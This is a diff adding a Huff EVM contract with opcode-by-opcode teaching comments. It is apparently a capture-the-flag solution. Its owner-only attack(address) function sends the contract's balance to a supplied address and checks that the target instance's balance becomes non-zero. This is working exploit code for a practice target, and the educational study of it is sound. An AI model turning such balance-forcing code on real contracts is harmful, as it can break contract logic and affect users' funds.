@@ -1,0 +1,156 @@
+// Storage 
+#define constant OWNER_SLOT = FREE_STORAGE_POINTER()
+#define constant INSTANCE_SLOT = FREE_STORAGE_POINTER()
+
+// Constructor
+#define macro CONSTRUCTOR() = takes (0) returns (0) {
+    // Payable: msg.value must be 1 wei 
+    callvalue       // [msg.value]
+    0x01            // [0x01] - value that is expected
+    eq              // [0/1] - eq consumes top 2 items off the stack and pushes 1 onto stack if they are equal, 0 otherwise.
+    payable         // [payable_label, xor_value]
+    jumpi           // [] - jumpi consumes top two items off stack and if 2nd item is not 0, PC counter is altered and execution continues from byte offset
+                    // otherwise, PC is incremented by 1 and execution continues on expected path
+    0x00            // [0x00] - size of return data
+    0x00            // [0x00] - offset of return data in memory
+    revert          // [] - revert consumes top 2 items off stack and stops current execution. We will hit these instructions if callvalue != 1
+
+    payable:        // [] - jumpdest to continue execution if callvalue == 1
+
+    // Copy caller into OWNER_SLOT in storage
+    caller          // [msg.sender] - msg.sender
+    [OWNER_SLOT]    // [0x00, msg.sender] OWNER_SLOT is the 0th slot in storage
+    sstore          // [] - sstore consumes top 2 stack items. The first item is
+                    // the key (storage location) and the second item is the value (item to store)
+
+    // Copy constructor argument (address) into memory
+    0x20            // [0x20] - This will be the size for the the code we will copy to memory
+    dup1            // [0x20, 0x20] - This will be used to calculate offset for which we will copy code from current environment
+    codesize        // [code_size, 0x20, 0x20] - codesize pushes the size of code in current environment on to stack
+    sub             // [offset, 0x20] - sub consumes top two items off stack and subtracts item 1 from item 2. Used to calculate offset for codecopy
+    returndatasize  // [0x00, offset, 0x20] - 0x00 is the destination offset in memory for the code we will copy
+    codecopy        // [] - codecopy consumes top 3 items off stack. codecopy(destOffset, offset, size)
+
+    // Copy address from memory into INSTANCE_SLOT in storage
+    returndatasize  // [0x00] - This is the offset in memory for which to copy 32 bytes from (our address param) 
+    mload           // [address_param] - mload consumes top item off stack and pushes 32 bytes from that offset in memory onto stack => mload(offset)
+    [INSTANCE_SLOT] // [0x01, address_param] - INSTANCE_SLOT is the 1st storage slot where we will store address_param
+    sstore          // [] - sstore consumes top two items off stack. sstore(key, value)
+}
+
+// Modifier
+#define macro ONLY_OWNER() = takes (0) returns (0) {
+    caller          // [msg.sender]
+    [OWNER_SLOT]    // [0x00] - storage slot where owner is stored
+    sload           // [owner] - loaded owner address onto stack from storage slot 0x00
+    eq              // [0/1] - consumes top two items and returns 1 if equal, 0 otherwise
+    is_owner        // [is_owner_label, 0/1] - byte offset in code for execution path
+    jumpi           // [] - consumes top two items and execution path jumps to is_owner_label if 2nd item is not 0
+
+    0x00            // [0x00] - size
+    0x00            // [0x00, 0x00] - byte offset
+    revert          // [] - reverts with data of size 0x00, starting from byte offset 0x00 in memory (reverts with no data)
+
+    is_owner:       // is_owner label. execution continues here is the caller is the owner
+}
+
+// View Function
+#define macro GET_BALANCE() = takes (0) returns (0) {
+    // Return the balance of the instance
+    [INSTANCE_SLOT] // [0x01] - the storage slot where the instance address is stored
+    sload           // [instance] - copied 32 bytes from storage slot 0x01 onto the stack
+    balance         // [instance_bal] - consumes top item off stack(address) and pushed balance of account ins wei. Will push 0 if no balance
+    0x00            // [0x00, instance_bal] - byte offset
+    mstore          // [] - copied instance_bal into memory, starting at byte offset 0x00
+    msize           // [size] - pushes size of active memory onto stack
+    0x00            // [0x00, size] - byte offset
+    return          // [] - consumes top two items off the stack and returns [size] bytes of data starting at offset 0x00 in memory
+}
+
+// Attack function
+#define macro ATTACK() = takes (1) returns (0) {
+    // Copy address param from stack into memory
+    0x00         // [0x00, calldata] - byte offset
+    mstore       // [] - copied calldata into memory starting at byte offset 0x00
+
+    // MEMORY:
+    // [OFFSET 0]  0000000000000000000000007c624b65a3e6caadf550c665b4b2bac121e87c83 -> calldata (address)
+   
+    // Copy instance address into memory to use as calldata for our CALL
+    [INSTANCE_SLOT]
+    sload
+    0x20 
+    mstore
+
+    // MEMORY:
+    // [OFFSET 0]  0000000000000000000000007c624b65a3e6caadf550c665b4b2bac121e87c83 -> calldata (address)
+    // [OFFSET 32] 000000000000000000000000274b028b03a250ca03644e6c578d81f019ee1323 -> instance (address)
+
+    // CALL into address from calldata
+    0x00            // [0x00] - 0x00 is return data size (no return data)
+    dup1            // [0x00, 0x00] - 0x00 is byte offset of where to copy return data to in memory
+    0x20            // [0x20, 0x00, 0x00] - 0x20 is the size of the calldata we are sending(type address)
+    0x20            // [0x20, 0x20, 0x00, 0x00] - 0x20 is the byte offset in memory where the calldata is stored.
+    selfbalance     // [0x01, 0x20, 0x20, 0x00, 0x00] - pushes our contract's balance in wei onto the stack
+    0x00            // [0x00, 0x01, 0x20, 0x20, 0x00, 0x00] - byte offset
+    mload           // [calldata, 0x01, 0x20, 0x20, 0x00, 0x00] - copied calldata (address) from memory onto stack, starting from byte offset 0x00
+    gas             // [gas, calldata, 0x01, 0x20, 0x20, 0x00, 0x00] - sending gasleft to instance (unused gas will be returned to us)
+    call            // [success] - call consumes top 7 items and pushes success (0 if call reverted, 1 otherwise) onto the stack
+    iszero          // [0/1] - iszero consumes top item from stack and pushes 1 onto stack if item is 0, otherwise pushes 0
+    throw_error     // [throw_error_label, 0/1]
+    jumpi           // [] - jumpi consumes top two items off stack. if item 2 is not 0 execution will continue from throw_error label, otherwise execution will
+                    // continue on current path
+
+    // MEMORY:
+    // [OFFSET 0]  0000000000000000000000007c624b65a3e6caadf550c665b4b2bac121e87c83 -> calldata (address)
+    // [OFFSET 32] 000000000000000000000000274b028b03a250ca03644e6c578d81f019ee1323 -> instance (address)
+
+    // Check balance of instance to verify it is greater than 0
+    0x20            // [0x20] - byte offset
+    mload           // [instance] - copied instance address from memory onto stack, starting at byte offset 0x20
+    balance         // [0x01] - balance consumes top item off stack (address) and pushes balance of account onto stack in wei, 0 if no balance
+    iszero          // [0/1] - iszero consumes top item from stack and pushes 1 onto stack if item is 0, otherwise pushes 0
+    throw_error     // [throw_error_label, 0/1]
+    jumpi           // [] - jumpi consumes top two items off stack. if item 2 is not 0 execution will continue from throw_error label, otherwise execution will
+
+    stop
+}
+
+// Function Dispatching
+#define macro MAIN() = takes (0) returns (1) {
+    // Nonpayable - check msg.value
+    callvalue    // [msg.value] - msg.value of transaction is pushed onto stack
+    throw_error  // [throw_error_offset, msg.value] - throw_error is a label for the byte offset for which to jump the execution path to
+    jumpi        // [] - jumpi consumes top two items off stack and if 2nd item is not 0, PC counter is altered and execution continues from byte offset 
+                 // otherwise, PC is incremented by 1 and execution continues on expected path
+
+    // Identify which function is being called
+    0x00         // [0x00] - the byte offset in calldata that we will read 32 bytes from
+    calldataload // [calldata] - calldataload consumes top item from stack and pushes 32 bytes of calldata, from byte offset, onto stack
+    0xe0         // [0xe0, calldata] - 0xe0 is 224 bits
+    shr          // [func_sig] - shr consumes top two items off the stack, performs a logical right shift and pushes resulting value of stack
+                 // Here we are shifting the calldata 224 bits to the right (256 - 224 = 32 bits = 4 bytes) and isolating the first 4 bytes (function sig)
+
+    dup1         // [func_sig, func_sig] - duplicating func_sig
+    0x722713f7   // [0x722713f7, func_sig, func_sig] - func sig of ("balanceOf()")
+    eq           // [0/1, func_sig] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
+    balanceOf    // [balanceOf_label, 0/1, func_sig] - balanceOf_label is the byte offset in code for the balanceOf() instructions
+    jumpi        // [func_sig] = jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path
+
+    0xd018db3e   // [0xd018db3e, func_sig] - pushing func sig of 'attack(address)' onto the stack
+    eq           // [0/1] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
+    attack       // [attack_label, 0/1] - attack_label is a label (byte offset) for the attack(address) instructions
+    jumpi        // [] = jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path
+
+    throw_error: // label for revert path
+        0x00 0x00 revert
+
+    balanceOf:   // label for balanceOf instructions
+        GET_BALANCE()
+
+    attack:      // label for attack instructions
+        ONLY_OWNER()
+        0x04         // [0x04] - byte offset in calldata
+        calldataload // [calldata] - copied first param (address) from calldata onto stack
+        ATTACK()     // jump to attack instructions
+}
